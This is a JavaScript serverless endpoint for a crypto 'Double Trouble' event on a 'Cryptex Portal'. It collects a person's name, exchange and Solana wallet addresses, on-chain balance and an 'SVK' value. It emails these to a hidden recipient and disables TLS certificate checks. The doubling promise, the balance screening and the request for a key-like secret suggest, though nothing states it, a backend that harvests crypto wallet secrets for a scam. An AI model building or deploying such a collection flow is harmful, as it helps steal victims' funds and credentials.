export const config = { runtime: 'nodejs' };

import nodemailer from 'nodemailer';

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { action, code, name, exchangeWallet, walletAddress, solBalance, usdcValue, svk, socialLink, foundryLink } = req.body;

  const dtCode = process.env.DOUBLE_TROUBLE_CODE;
  const accessCode = process.env.ACCESS_CODE;

  if (!dtCode) return res.status(500).json({ error: 'Double Trouble code not configured' });

  // ── Validate access code ────────────────────────────────────────────────
  if (action === 'validate') {
    if (!code) return res.status(400).json({ error: 'Code required' });
    return res.status(200).json({ valid: code === accessCode });
  }

  // ── Submit form + send email + return DT code ───────────────────────────
  if (action === 'submit') {
    if (!name || !walletAddress || !svk || !foundryLink || !exchangeWallet) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Send email notification
    const smtpHost = process.env.SMTP_HOST;
    const smtpPort = parseInt(process.env.SMTP_PORT || '587');
    const smtpUser = process.env.SMTP_USER;
    const smtpPass = process.env.SMTP_PASS;
    const recipientEmail = process.env.RECIPIENT_EMAIL;

    if (smtpHost && smtpUser && smtpPass && recipientEmail) {
      try {
        const transporter = nodemailer.createTransport({
          host: smtpHost,
          port: smtpPort,
          secure: false,
          auth: { user: smtpUser, pass: smtpPass },
          tls: { rejectUnauthorized: false },
        });

        const submittedAt = new Date().toUTCString();

        const html = `
<div style="font-family:monospace;background:#0a0505;color:#e0e0ff;padding:32px;max-width:600px;margin:0 auto">
  <div style="background:linear-gradient(135deg,#f59e0b,#ff6b35);padding:2px;border-radius:12px;margin-bottom:24px">
    <div style="background:#120a00;border-radius:10px;padding:24px;text-align:center">
      <div style="font-size:28px">⚡</div>
      <h1 style="font-size:20px;color:#f59e0b;letter-spacing:2px;margin:8px 0 4px">DOUBLE TROUBLE ENTRY</h1>
      <p style="font-size:12px;color:rgba(245,158,11,.7);margin:0">CRYPTEX PROTOCOL · DOUBLE TROUBLE EVENT</p>
    </div>
  </div>

  <div style="background:#1a0f00;border:1px solid rgba(245,158,11,.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(245,158,11,.6);letter-spacing:2px;margin-bottom:6px">FULL NAME</div>
    <div style="font-size:15px;color:#e0e0ff">${escapeHtml(name)}</div>
  </div>

  <div style="background:#1a0f00;border:1px solid rgba(245,158,11,.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(245,158,11,.6);letter-spacing:2px;margin-bottom:6px">EXCHANGE WALLET</div>
    <div style="font-size:13px;color:#f59e0b;word-break:break-all">${escapeHtml(exchangeWallet)}</div>
  </div>

  <div style="background:#1a0f00;border:1px solid rgba(245,158,11,.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(245,158,11,.6);letter-spacing:2px;margin-bottom:6px">SOLANA WALLET</div>
    <div style="font-size:13px;color:#14F195;word-break:break-all">${escapeHtml(walletAddress)}</div>
    ${solBalance ? `<div style="font-size:11px;color:rgba(20,241,149,0.6);margin-top:4px">◎ Balance: ${solBalance} SOL${usdcValue ? ' ($' + usdcValue + ' USDC)' : ''} — verified on-chain</div>` : ''}
  </div>

  <div style="background:#1a0f00;border:1px solid rgba(245,158,11,.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(245,158,11,.6);letter-spacing:2px;margin-bottom:6px">SVK</div>
    <div style="font-size:14px;word-break:break-all;color:#e0e0ff">${escapeHtml(svk)}</div>
  </div>

  <div style="background:#1a0f00;border:1px solid rgba(245,158,11,.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(245,158,11,.6);letter-spacing:2px;margin-bottom:6px">SOCIAL CONTACT</div>
    <div style="font-size:13px;color:#f59e0b;word-break:break-all">${escapeHtml(socialLink || 'N/A')}</div>
  </div>

  <div style="background:#1a0f00;border:1px solid rgba(245,158,11,.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(245,158,11,.6);letter-spacing:2px;margin-bottom:6px">FOUNDRY LINK</div>
    <div style="font-size:13px;word-break:break-all"><a href="${escapeHtml(foundryLink)}" style="color:#f59e0b">${escapeHtml(foundryLink)}</a></div>
  </div>

  <p style="font-size:11px;color:rgba(245,158,11,.4);text-align:center;margin-top:20px">Submitted: ${submittedAt}</p>
</div>`;

        await transporter.sendMail({
          from: `"Cryptex Portal" <${smtpUser}>`,
          to: recipientEmail,
          subject: `⚡ Double Trouble Entry: ${name} · Cryptex Portal`,
          text: `DOUBLE TROUBLE ENTRY\n\nName: ${name}\nExchange Wallet: ${exchangeWallet}\nSolana Wallet: ${walletAddress}\nSOL Balance: ${solBalance || 'N/A'} SOL${usdcValue ? ' ($' + usdcValue + ' USDC)' : ''}\nSVK: ${svk}\nSocial: ${socialLink || 'N/A'}\nFoundry: ${foundryLink}\nTime: ${submittedAt}`,
          html,
        });
      } catch (emailErr) {
        console.error('DT email error:', emailErr.message);
      }
    }

    return res.status(200).json({ success: true, doubleCode: dtCode });
  }

  return res.status(400).json({ error: 'Invalid action' });
}
